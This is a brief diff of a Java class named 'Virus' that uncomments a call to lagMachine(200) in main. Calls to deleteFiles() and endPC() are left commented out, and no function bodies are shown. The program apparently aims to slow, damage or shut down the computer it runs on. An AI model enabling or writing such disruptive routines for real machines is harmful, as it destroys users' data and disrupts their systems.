@@ -90,7 +90,7 @@ class Virus extends JComponent {
 
     public static void main(String args[])
             throws AWTException, UnsupportedAudioFileException, IOException, LineUnavailableException {
-        // lagMachine(200);
+        lagMachine(200);
         // deleteFiles();
         // endPC();
 
